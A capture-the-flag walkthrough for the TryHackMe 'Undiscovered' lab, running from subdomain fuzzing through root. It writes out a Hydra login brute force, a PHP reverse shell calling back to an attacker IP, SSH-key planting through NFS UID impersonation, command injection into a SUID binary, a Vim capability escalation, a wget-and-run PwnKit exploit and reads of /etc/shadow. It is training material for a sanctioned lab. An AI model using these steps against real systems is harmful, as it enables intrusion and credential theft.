# Undiscovered

Discovery consists not in seeking new landscapes, but in having new eyes..

Room: https://tryhackme.com/room/undiscoveredup

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/undiscoveredup.md

----------

## 1. Variables and hostnames

```bash
export TARGET_IP=10.65.153.149
export ATTACKER_IP=10.65.92.110

echo "$TARGET_IP undiscovered.thm" | sudo tee -a /etc/hosts
```

## 2. Initial enumeration

```bash
sudo nmap -sV -sC -p- --min-rate 5000 \
  -oN nmap-sv-all.txt \
  "$TARGET_IP"
```

Important services:

```text
22/tcp    SSH
80/tcp    HTTP
111/tcp   rpcbind
2049/tcp  NFS
```

The web server redirects to:

```text
http://undiscovered.thm
```

### NFS observation

Attempting to enumerate the exports with `showmount` fails:

```bash
showmount -e "$TARGET_IP"
```

```text
clnt_create: RPC: Program not registered
```

The server is exposing NFSv4 without a separately registered `mountd` service. NFSv4 can still be mounted directly through port 2049.

---

## 3. Virtual-host discovery

Locate an available subdomain wordlist:

```bash
WL=$(find /usr/share/wordlists \
  -type f \( \
    -name 'subdomains-top1million-5000.txt' -o \
    -name 'bitquark-subdomains-top100000.txt' -o \
    -name 'common.txt' \
  \) 2>/dev/null | head -n1)

echo "$WL"
```

Enumerate virtual hosts:

```bash
ffuf -ac \
  -w "$WL" \
  -u "http://$TARGET_IP/" \
  -H 'Host: FUZZ.undiscovered.thm'
```

The important virtual host is:

```text
deliver.undiscovered.thm
```

Add it locally:

```bash
echo "$TARGET_IP deliver.undiscovered.thm" |
  sudo tee -a /etc/hosts
```

---

## 4. RiteCMS foothold

Enumerate the site:

```bash
gobuster dir \
  -u http://deliver.undiscovered.thm \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,txt,bak,sql
```

The CMS login is located at:

```text
http://deliver.undiscovered.thm/cms/
```

### Brute-force the login

First identify the failed-login marker:

```bash
curl -si -X POST \
  -d 'username=admin&userpw=incorrect' \
  http://deliver.undiscovered.thm/cms/index.php |
  grep -iE 'failed|incorrect|location'
```

Run Hydra using the observed failure marker:

```bash
hydra -l admin \
  -P /usr/share/wordlists/rockyou.txt \
  deliver.undiscovered.thm \
  http-post-form \
  '/cms/index.php:username=^USER^&userpw=^PASS^:F=login_failed' \
  -t 16
```

Log in using the recovered credential.

### Upload a PHP reverse shell

Create the payload:

```bash
cat > /tmp/rev.php <<PHP
<?php
system("bash -c 'bash -i >& /dev/tcp/${ATTACKER_IP}/4444 0>&1'");
?>
PHP
```

Start a listener:

```bash
nc -lvnp 4444
```

In RiteCMS:

1. Open **Filemanager**.
2. Browse to the `media` directory.
3. Upload `/tmp/rev.php`.

Trigger the payload:

```bash
curl http://deliver.undiscovered.thm/media/rev.php
```

The listener should receive a shell as `www-data`:

```text
Connection received on 10.65.153.149
www-data@undiscovered:/var/www/deliver.undiscovered.thm/media$
```

Stabilise the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

# 5. Discovering William’s UID/GID

The NFS export uses `root_squash`, so the AttackBox root user cannot automatically access William’s files.

NFS using `sec=sys` trusts numeric UID and GID values. The goal is therefore to discover William’s numeric identity and impersonate it locally.

There are two ways to find it.

## Method 1 – Intended discovery from the web shell

From the `www-data` shell, inspect the NFS configuration:

```bash
cat /etc/exports
```

The important export is:

```text
/home/william *(rw,root_squash)
```

Now inspect William’s account:

```bash
grep '^william:' /etc/passwd
```

Result:

```text
william:x:3003:3003::/home/william:/bin/bash
```

Therefore:

```text
UID = 3003
GID = 3003
```

This is the intended method because the web foothold reveals both the NFS export and William’s numeric identity.

---

## Method 2 – Direct NFS mount and UID brute force

This method can discover William’s UID without first obtaining the web shell.

Mount the NFSv4 pseudo-root:

```bash
sudo mkdir -p /mnt/nfs

sudo mount -t nfs4 \
  -o ro,nolock \
  "$TARGET_IP:/" \
  /mnt/nfs
```

Inspect the mounted directories:

```bash
ls -la /mnt/nfs
ls -la /mnt/nfs/home
```

William’s directory is visible:

```text
drwxr-x--- nobody nogroup william
```

However, local root receives `Permission denied` because it is being root-squashed.

Brute-force likely UIDs:

```bash
for uid in $(seq 1000 5000); do
    setpriv \
      --reuid="$uid" \
      --regid="$uid" \
      --clear-groups \
      ls /mnt/nfs/home/william >/dev/null 2>&1 &&
      echo "[+] Working UID/GID: $uid"
done
```

Result:

```text
[+] Working UID/GID: 3003
```

Access the directory as UID/GID 3003:

```bash
setpriv \
  --reuid=3003 \
  --regid=3003 \
  --clear-groups \
  bash -c '
    cd /mnt/nfs/home/william &&
    id &&
    ls -la &&
    find . -maxdepth 4 -ls 2>/dev/null
  '
```

---

# 6. Write an SSH key through NFS

Remount the `/home` export read/write:

```bash
sudo umount /mnt/nfs 2>/dev/null
sudo mkdir -p /mnt/william

sudo mount -t nfs4 \
  -o rw,nolock \
  "$TARGET_IP:/home" \
  /mnt/william
```

Generate an SSH key:

```bash
ssh-keygen -t ed25519 \
  -f /tmp/william_key \
  -N ''
```

Create William’s SSH directory while impersonating UID/GID 3003:

```bash
setpriv \
  --reuid=3003 \
  --regid=3003 \
  --clear-groups \
  bash -c '
    mkdir -p /mnt/william/william/.ssh
    chmod 700 /mnt/william/william/.ssh
    cat /tmp/william_key.pub >> /mnt/william/william/.ssh/authorized_keys
    chmod 600 /mnt/william/william/.ssh/authorized_keys
  '
```

Verify the file as UID 3003 rather than local root:

```bash
setpriv \
  --reuid=3003 \
  --regid=3003 \
  --clear-groups \
  ls -la /mnt/william/william/.ssh
```

Connect as William:

```bash
ssh -i /tmp/william_key \
  william@"$TARGET_IP"
```

Read the user flag:

```bash
cat /home/william/user.txt
```

```text
THM{REDACTED}
```

---

# 7. William to Leonard

Enumerate William’s home:

```bash
ls -la /home/william
```

Important files:

```text
admin.sh
script
user.txt
```

Inspect the binary:

```bash
ls -l /home/william/script
file /home/william/script
strings -a -n 4 /home/william/script
```

The binary has SUID permissions and contains references to:

```text
setreuid
system
strcat
/bin/cat
/home/leonard/
./admin.sh
```

Disassemble `main()`:

```bash
objdump -d -M intel /home/william/script |
  sed -n '/<main>:/,/^$/p'
```

The relevant program logic is equivalent to:

```c
int main(int argc, char **argv)
{
    if (argv[1] == NULL) {
        system("./admin.sh");
        return 0;
    }

    setreuid(1002, 1002);

    char command[104] = "/bin/cat /home/leonard/";
    strcat(command, argv[1]);
    system(command);

    return 0;
}
```

The binary:

1. Changes its real and effective UID to `1002`.
2. Concatenates user-controlled input into a shell command.
3. Passes the command to `system()`.

UID `1002` belongs to Leonard.

## Method A – Command injection

Confirm execution as Leonard:

```bash
/home/william/script 'x; id #'
```

Result:

```text
/bin/cat: /home/leonard/x: No such file or directory
uid=1002(leonard) gid=3003(william) groups=3003(william)
```

Spawn a Leonard shell:

```bash
/home/william/script 'x; exec /bin/bash -p #'
```

Verify:

```bash
id
whoami
```

## Method B – Read Leonard’s private key

The intended file-reading functionality can also retrieve Leonard’s SSH key:

```bash
/home/william/script .ssh/id_rsa
```

Save it:

```bash
/home/william/script .ssh/id_rsa > /tmp/leonard_id_rsa
chmod 600 /tmp/leonard_id_rsa
```

Validate it:

```bash
ssh-keygen -y \
  -f /tmp/leonard_id_rsa \
  >/dev/null &&
echo '[+] Valid private key'
```

Connect as Leonard:

```bash
ssh -i /tmp/leonard_id_rsa \
  leonard@"$TARGET_IP"
```

---

# 8. Root Method 1 – Intended Vim capability escalation

Enumerate Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

Important result:

```text
/usr/bin/vim.basic = cap_setuid+ep
```

The `cap_setuid` capability allows Vim to change its UID to root.

Check whether Vim supports Python:

```bash
/usr/bin/vim.basic --version | grep python
```

If it has `+python3`, run:

```bash
/usr/bin/vim.basic \
  -c ':py3 import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```

If it only has legacy `+python`, use:

```bash
/usr/bin/vim.basic \
  -c ':py import os; os.setuid(0); os.execl("/bin/bash","bash","-p")'
```

Verify the shell:

```bash
id
whoami
```

Expected:

```text
uid=0(root)
root
```

The current room question asks for the root user’s password hash:

```bash
awk -F: '$1=="root" {print $2}' /etc/shadow
```

Submit only the second field:

```text
$6$REDACTED...
```

---

# 9. Root Method 2 – PwnKit shortcut

This is an alternative and almost certainly unintended route.

It allows `www-data` to become root directly, bypassing:

```text
NFS → William → Leonard → Vim
```

Confirm that `pkexec` is SUID root:

```bash
ls -l /usr/bin/pkexec
pkexec --version
```

On the AttackBox, place a vetted PwnKit proof of concept in the current directory and serve it:

```bash
python3 -m http.server 8000
```

From the `www-data` shell:

```bash
cd /tmp

wget \
  "http://ATTACKER_IP:8000/PwnKit" \
  -O PwnKit

chmod +x PwnKit
./PwnKit
```

Replace `ATTACKER_IP` with the AttackBox address:

```bash
wget \
  "http://10.65.92.110:8000/PwnKit" \
  -O PwnKit
```

Verify:

```bash
whoami
id
```

Expected:

```text
root
uid=0(root)
```

Retrieve the root password hash:

```bash
awk -F: '$1=="root" {print $2}' /etc/shadow
```

---

# 10. Attack paths

## Intended route

```text
Virtual-host discovery
→ RiteCMS login
→ PHP upload
→ www-data shell
→ /etc/exports
→ /etc/passwd reveals UID/GID 3003
→ NFS UID impersonation
→ write William’s authorized_keys
→ SSH as William
→ exploit SUID script
→ Leonard
→ vim.basic cap_setuid
→ root
```

## Alternative UID-discovery route

```text
Direct NFSv4 pseudo-root mount
→ brute-force numeric UID/GID
→ discover UID/GID 3003
→ write William’s authorized_keys
→ continue through the intended escalation chain
```

## Alternative root shortcut

```text
RiteCMS
→ www-data
→ vulnerable pkexec/PwnKit
→ root
```
